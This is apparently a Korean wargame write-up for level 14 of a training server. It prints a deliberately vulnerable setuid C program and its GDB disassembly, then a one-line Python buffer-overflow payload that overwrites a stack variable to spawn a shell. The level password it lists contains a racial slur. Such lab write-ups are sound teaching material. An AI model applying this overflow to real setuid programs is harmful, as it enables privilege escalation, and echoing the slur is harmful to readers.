---
sort: 14
---

# Level 14

```note
id : level14

password : what that nigga want?
```

hint를 보면 attackme의 소스코드가 나온다.<br>
attackme에 setuid가 걸려있으니 얘를 공격해보자.

```c
#include <stdio.h>
#include <unistd.h>
 
main()
{ int crap;
  int check;
  char buf[20];
  fgets(buf,45,stdin);
  if (check==0xdeadbeef)
   {
     setreuid(3095,3095);
     system("/bin/sh");
   }
}
```
지역변수 check만 변조하면 되는 간단한 문제다.<br><br>
GDB를 이용하여 attackme의 main함수를 disassemble했다.

<pre>
(gdb) disas main
Dump of assembler code for function main:
0x08048490 (main+0):	push   %ebp
0x08048491 (main+1):	mov    %esp,%ebp
0x08048493 (main+3):	sub    $0x38,%esp
0x08048496 (main+6):	sub    $0x4,%esp
0x08048499 (main+9):	pushl  0x8049664
0x0804849f (main+15):	push   $0x2d

<b>0x080484a1 (main+17):	lea    0xffffffc8(%ebp),%eax
0x080484a4 (main+20):	push   %eax
0x080484a5 (main+21):	call   0x8048360 (fgets) </b>

0x080484aa (main+26):	add    $0x10,%esp

<b>0x080484ad (main+29):	cmpl   $0xdeadbeef,0xfffffff0(%ebp) </b>

0x080484b4 (main+36):	jne    0x80484db (main+75)
0x080484b6 (main+38):	sub    $0x8,%esp
0x080484b9 (main+41):	push   $0xc17
0x080484be (main+46):	push   $0xc17
0x080484c3 (main+51):	call   0x8048380 (setreuid)
0x080484c8 (main+56):	add    $0x10,%esp
0x080484cb (main+59):	sub    $0xc,%esp
0x080484ce (main+62):	push   $0x8048548
0x080484d3 (main+67):	call   0x8048340 (system)
0x080484d8 (main+72):	add    $0x10,%esp
0x080484db (main+75):	leave  
0x080484dc (main+76):	ret    
0x080484dd (main+77):	lea    0x0(%esi),%esi
</pre>

level13과 거의 같은 문제다. 빠르게 넘어가자.

```bash
# padding 0x28 byte + 0xdeadbeef
[level14@ftz level14]$ (python -c "print('A'*0x28+'\xef\xbe\xad\xde\n')";cat) | ./attackme 
my-pass
```

```tip
## 알게 된 점

buffer overflow
```